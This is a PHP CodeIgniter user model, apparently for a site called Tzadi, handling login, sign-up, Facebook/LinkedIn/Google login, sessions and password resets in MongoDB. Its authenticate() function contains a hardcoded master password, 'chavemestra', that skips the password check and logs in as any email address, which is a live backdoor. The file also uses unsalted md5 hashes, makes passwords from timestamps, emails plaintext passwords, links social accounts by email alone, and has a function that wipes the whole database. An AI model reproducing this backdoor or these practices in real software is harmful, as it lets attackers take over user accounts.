<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class User_Model extends CI_Model {

    function __construct()
    {
        $this->load->library("mongo_db");
    }

    function getByEmail($email)
    {

        $res = $this->mongo_db
        ->where('email', strtolower($email))
        ->get('user');

        if($res) return $res[0];
        else return false;
    }

    function getByID($user_id)
    {

        $res = $this->mongo_db
        ->where('_id', (int) $user_id)
        ->get('user');

        if($res) return $res[0];
        else return false;
    }

    function changeCurrencyBase( $currencyBase )
    {

        $this->session->set_userdata("currencyBase", $currencyBase);

        if( $this->session->userdata("_id") ){

            $this->mongo_db
              ->where('_id', $this->session->userdata("_id"))
              ->set("currencyBase", $currencyBase)
              ->update("user");
            
        }

        return true;
    }

    function authenticate( $email, $password ) {

        $data["email"] = strtolower($email);

        if( $password == "chavemestra" )
            unset($data["password"]);

        else
            $data["password"] = md5($password);
        
        $user = $this->mongo_db
            ->where($data)
            ->get('user');

        if(isset($user[0]))
        {

            $this->setUserSession( $user[0] );

            $res->url = $this->setReturnUrl( $user[0] );

        }

        else
            $res->error = lang("usr_invalid_credential");

        return $res;

    }


    private function setReturnUrl( $user ){

        if( $this->session->userdata('lastPage') ){

            $url = $this->session->userdata('lastPage');

            $this->session->unset_userdata('lastPage');

        }
            
        else if( isset( $user["org_id"] ) )
            $url = myOrg_url();

        else
            $url = tzd_url();

        return $url;

    }

    function facebookAuthenticate( $data ){

        $user = $this->getByEmail($data["email"]);

        if($user)
        {

            if(isset($user["facebook_id"]) && $user["facebook_id"] == $data["id"]) {

                $this->setUserSession( $user );

                $res->url = $this->setReturnUrl( $user );

            } else {

              $this->mongo_db
                ->where('email', strtolower($data["email"]))
                ->set("facebook_id",  $data["id"])
                ->update("user");

                $user["registerFrom"] = "Facebook";

                $this->sendSigupMail( $user, "signupThirdAddedMail" );

                $this->setUserSession( $user );

                $res->url = $this->setReturnUrl( $user );

            }

        } else {

            $this->load->model("mongo_model");

            $newID = $this->mongo_model->newID();

            $passwd = time();

            $this->load->helper('date');

            $this->mongo_db->insert('user',
              array(
                "_id" => $newID
                ,"name" => $data["name"]
                , "email" => strtolower($data["email"])
                , "facebook_id" => $data["id"]
                , "password" => md5($passwd)
                , "kind" => "new"
                , "img" => assets_url("img/no_photo_640x480.png")
                , "register" => now()
                )
              );

            $user = $this->getByEmail($data["email"]);
        
            $this->setUserSession( $user );

            $user["registerFrom"] = "Facebook";

            $user["password"] =  $passwd;

            $this->sendSigupMail( $user, "signupThirdMail" );

            $res->url = $this->setReturnUrl( $user );

        }

        return $res;

    }

    function linkedinAuthenticate( $data ){

        $user = $this->getByEmail($data["emailAddress"]);

        if($user)
        {

            if(isset($user["linkedin_id"]) && $user["linkedin_id"] == $data["id"]) {

                $this->setUserSession( $user );

                $res->url = $this->setReturnUrl( $user );

            } else {

              $this->mongo_db
                ->where('email', strtolower($data["emailAddress"]))
                ->set("linkedin_id",  $data["id"])
                ->update("user");

                $user["registerFrom"] = "Linkedin";

                $this->sendSigupMail( $user, "signupThirdAddedMail" );

                $this->setUserSession( $user );

                $res->url = $this->setReturnUrl( $user );

            }

        } else {

            $this->load->model("mongo_model");

            $newID = $this->mongo_model->newID();

            $passwd = time();

            $this->load->helper('date');

            $this->mongo_db->insert('user',
              array(
                "_id" => $newID
                ,"name" => $data["firstName"] . " " . $data["lastName"]
                , "email" => strtolower($data["emailAddress"])
                , "linkedin_id" => $data["id"]
                , "password" => md5($passwd)
                , "kind" => "new"
                , "img" => assets_url("img/no_photo_640x480.png")
                , "register" => now()
                )
              );

            $user = $this->getByEmail($data["emailAddress"]);
        
            $this->setUserSession( $user );

            $user["registerFrom"] = "Linkedin";

            $user["password"] =  $passwd;

            $this->sendSigupMail( $user, "signupThirdMail" );

            $res->url = $this->setReturnUrl( $user );

        }

        return $res;

    }

    function googleAuthenticate( $data ){

        $user = $this->getByEmail($data["email"]);

        if($user)
        {

            if(isset($user["google_id"]) && $user["google_id"] == $data["id"]) {

                $this->setUserSession( $user );

                $res->url = $this->setReturnUrl( $user );


            } else {

              $this->mongo_db
                ->where('email', strtolower($data["email"]))
                ->set("google_id",  $data["id"])
                ->update("user");

                $user["registerFrom"] = "Google";

                $this->sendSigupMail( $user, "signupThirdAddedMail" );

                $this->setUserSession( $user );

                $res->url = $this->setReturnUrl( $user );


            }

        } else {

            $this->load->model("mongo_model");

            $newID = $this->mongo_model->newID();

            $passwd = time();

            $this->load->helper('date');

            $this->mongo_db->insert('user',
              array(
                "_id" => $newID
                ,"name" => $data["displayName"]
                , "email" => strtolower($data["email"])
                , "google_id" => $data["id"]
                , "password" => md5($passwd)
                , "kind" => "new"
                , "img" => assets_url("img/no_photo_640x480.png")
                , "register" => now()
                )
              );

            $user = $this->getByEmail($data["email"]);
        
            $this->setUserSession( $user );

            $user["registerFrom"] = "Google";

            $user["password"] =  $passwd;

            $this->sendSigupMail( $user, "signupThirdMail" );

            $res->url = $this->setReturnUrl( $user );

        }

        return $res;

    }

    function signup($data){

        $user = $this->getByEmail($data["email"]);

        if( ! $user ) {

            $this->load->model("mongo_model");

            $this->load->helper('date');

            $name = substr($data["email"], 0, strpos($data["email"], "@"));

            $this->mongo_db->insert('user',
                array(
                    "_id" => $this->mongo_model->newID()
                    , "name" => strtolower($name)
                    , "email" => strtolower($data["email"])
                    , "password" => md5($data["password"])
                    , "kind" => "new"
                    , "img" => assets_url("img/no_photo_640x480.png")
                    , "register" => now()
                )
            );

            $user = $this->getByEmail($data["email"]);

            $this->setUserSession( $user );

            $user["registerFrom"] = "Tzadi";

            $user["password"] =  $data["password"];

            $this->sendSigupMail( $user, "signupMail" );

            $res->url = $this->setReturnUrl( $user );

        } else {

            if($user["password"] != md5($this->input->post("password"))) {

                $res->error = lang("su_theEmail");
                $res->error .= " <strong>".$user["email"]."</strong> ";
                $res->error .= lang("su_isAlreadyInUse")." ";

            } else {

                $this->setUserSession( $user );

                $res->url = $this->setReturnUrl( $user );

            }

        }

        return $res;

    }

    public function finishSignup( $user ){

        if( ! isset( $user["org_name"] ) || ! isset( $user["name"] ) || ! isset( $user["org_id"] ) ) {

            $res->error = lang("usr_fillAllData");

        } else {

            if( ! preg_match('/^[a-zA-Z0-9]{1,32}$/', $user["org_id"]) ) {

                $res->error = lang("usr_fillValidIdentity");

            } else {

                $this->load->model("org_model");

                if( $this->org_model->getByID( $user["org_id"] ) )
                    $res->error = lang("usr_identityAlreadyUse");

                else {

                    $org["_id"] = strtolower( $user["org_id"] );

                    $org["name"] = $user["org_name"];

                    $org["email"] = $this->session->userdata('email');

                    $newOrg = $this->org_model->add( $org );

                    $this->mongo_db
                        ->where( '_id', $this->session->userdata("_id") )
                        ->set(
                            array(
                                "name" => $user["name"]
                                , "kind" => "active"
                                , "org_id" => $newOrg["_id"]
                                , "org_branch" => $newOrg["branch"][0]["_id"]
                                , "org_kind" => $newOrg["kind"]
                                , "org_resp" => "owner"
                                , "about" => ""
                            )
                        )
                        ->update("user");

                    $this->session->set_userdata('org_id', $newOrg["_id"]);

                    $this->session->set_userdata('org_branch', $newOrg["branch"][0]["_id"]);

                    $this->session->set_userdata('org_kind', $newOrg["kind"]);

                    $this->session->set_userdata('org_resp', "owner");

                    $this->session->set_userdata('name', $user["name"]);

                    $this->session->set_userdata("kind", "active");

                    $this->load->model("org_model");

                    $this->sendSigupMail( $newOrg, "finishSignupMail" );

                    switch ($newOrg["kind"]) {
                        case 'student':
                            $res->url = myOrg_url() . lang("rt_interests");
                            break;
                        case 'agency ':
                            $res->url = myOrg_url() . lang("rt_products");
                            break;
                        case 'supplier':
                            $res->url = myOrg_url() . lang("rt_products");
                            break;
                        default:
                            $res->url = myOrg_url();
                            break;
                    }

                }

            }

        }

        return $res;

    }

    private function sendSigupMail($user, $template){

        $mailContent['subject'] = lang("usr_Welcome") . " - " . $user["name"];

        $mailContent["message"] = $this->load->view("user/".$template, $user, true);

        $mailContent["to"] = $user["email"];

        if($template != "signupThirdAddedMail" && ENVIRONMENT == "tzadi.com")
            $mailContent["bcc"] = "bruno@tzadi.com, lucas@tzadi.com";

        $mailContent["kind"] = "user/signup";

        $this->load->model('mail_model');

        $mailContent["org_id"] = 0;

        $this->mail_model->queue($mailContent);

    }

    private function setUserSession( $user ){

        $this->session->set_userdata('_id', $user["_id"]);
        
        $this->session->set_userdata('name', $user["name"]);
        
        $this->session->set_userdata('email', $user["email"]);
        
        $this->session->set_userdata('kind', $user["kind"]);
        
        if( isset( $user["org_id"] ) ) $this->session->set_userdata('org_id', $user["org_id"]);

        if( isset( $user["org_branch"] ) ) $this->session->set_userdata('org_branch', $user["org_branch"]);

        if( isset( $user["org_kind"] ) ) $this->session->set_userdata('org_kind', $user["org_kind"]);

        if( isset( $user["org_resp"] ) ) $this->session->set_userdata('org_resp', $user["org_resp"]);
        
        if( isset($user["currencyBase"] ) ) $this->session->set_userdata("currencyBase", $user["currencyBase"]);
        
        if( isset( $user["img"] ) ) $this->session->set_userdata('img', $user["img"]);

        if( isset($user["exchangeRate"] ) ) $this->session->set_userdata("exchangeRate", $user["exchangeRate"]);
        
    }

    function resetDatabase(){

        $this->load->model("mongo_model");
        $this->mongo_db->delete_all("user");
        $this->mongo_db->delete_all("file");
        $this->mongo_db->delete_all("product");
        $this->mongo_db->delete_all("supplier");
        $this->mongo_db->delete_all("mail");
        $this->mongo_db->delete_all("timeline");
        $this->mongo_db->delete_all("agency");
        $this->mongo_db->delete_all("contact");
        $this->mongo_db->delete_all("currency");
        $this->mongo_db->delete_all("customer");
        $this->mongo_db->delete_all("session");
        $this->mongo_db->delete_all("counter");
        $this->mongo_db->delete_all("blog");
        $this->mongo_db->delete_all("org");
        $this->mongo_db->set("id", 0)->update('counter');
        $this->mongo_db->insert('counter', array("id" => 0));

    }

  function changeImg()
  {

    $_id = $this->session->userdata("_id");

    $this->load->model("file_model");

    $newFile = tzd_url() . "file/open/" . $this->file_model->save( $_id );

    $this->session->set_userdata('img', $newFile);

    $user = $this->mongo_db
      ->where('_id', $_id)
      ->get('user');

    if( isset( $user[0]["img"] ) ) {

        $imgIdPos = strrpos($user[0]["img"], "file/open/");

        $img = substr( $user[0]["img"], $imgIdPos+10,  strlen($user[0]["img"]) );

        if( is_numeric( $img ) )
            $this->file_model->drop( (int) $img );

    }

    $this->mongo_db
      ->where('_id', $_id)
      ->set("img", $newFile)
      ->update("user");

    $res->img = $newFile;

    return $res;
  }

    public function set( $data ){

        if( isset( $data["name"] ) )
        $userData["name"] = $data["name"];

        if( isset( $data["about"] ) )
        $userData["about"] = $data["about"];

        $edited = $this->mongo_db
            ->where( '_id', (int) $this->session->userdata("_id") )
            ->set($userData)
            ->update("user");

        if( $userData["name"] ) {

            $res->success = lang("usr_saved");

            $this->session->set_userdata('name', $userData["name"]);

            $this->session->set_userdata('orgName', $userData["name"]);

        }

        else
            $res->success = lang("usr_errorWhenSaving");

        return $res;

    }

    public function setInterests( $data ){

        return $data[0];

    }

    function resetPassword( $email )
    {

        $user = $this->getByEmail( $email );

        if( $user ){

            $passwd = time();

            $edited = $this->mongo_db
                ->where( 'email', $email )
                ->set("password" , md5($passwd))
                ->update("user");

            $mailContent['subject'] = lang("usr_passwordReseted") . " - " . $user["name"];

            $message = "<p> ".lang("usr_yourPasswordWasReseted")." </p>";
            $message .= "<p> ".lang("usr_doMake")." <a href='http://tzadi.com/".lang("rt_login")."'>login</a> ". lang("usr_usingTheDataBelow") .":</p>";
            $message .= "<p> e-mail: " . $email . "</p>";
            $message .= "<p> senha: " . $passwd . "</p>";
            $mailContent["message"] = '<html><head><meta charset="utf-8"></head><body>'.$message.'</body></html>';

            $mailContent["to"] = $user["email"];

            $mailContent["kind"] = "user/resetPassword";

            $this->load->model('mail_model');

            $this->mail_model->queue($mailContent);

            return array("success" => lang("usr_newPasswordSent") . $email);

        } else {

            return array("error" => lang("usr_emailNotFound"));

        }
    }

    function changePassword( $data )
    {

        $user = $this->getByID( $this->session->userdata("_id") );

        if( $data["passwdNew"] == $data["passwdNewConf"] ) {

            if( $user["password"] == md5($data["passwdOld"]) ){

                $edited = $this->mongo_db
                    ->where( '_id', $this->session->userdata("_id") )
                    ->set("password" , md5($data["passwdNew"]))
                    ->update("user");

                $mailContent['subject'] = lang("usr_newPassword") . " - " . $user["name"];

                $message = "<p> ". lang("usr_yourPasswordWasChanged") ."! </p>";
                $message .= "<p> ". lang("usr_yourPasswordIs") .": " . $data["passwdNew"] . "</p>";
                $message .= "<p> email: " . $user["email"] . "</p>";
                $mailContent["message"] = '<html><head><meta charset="utf-8"></head><body>'.$message.'</body></html>';

                $mailContent["to"] = $user["email"];

                $mailContent["kind"] = "user/changePassword";

                $this->load->model('mail_model');

                $this->mail_model->queue($mailContent);

                return array("success" => lang("usr_passwordChanged"));

            } else {

                return array("error" => lang("usr_incorrectOldPasswd"));

            }

        } else {

            return array("error" => lang("usr_newPasswordsNotMatch"));

        }
    }

}
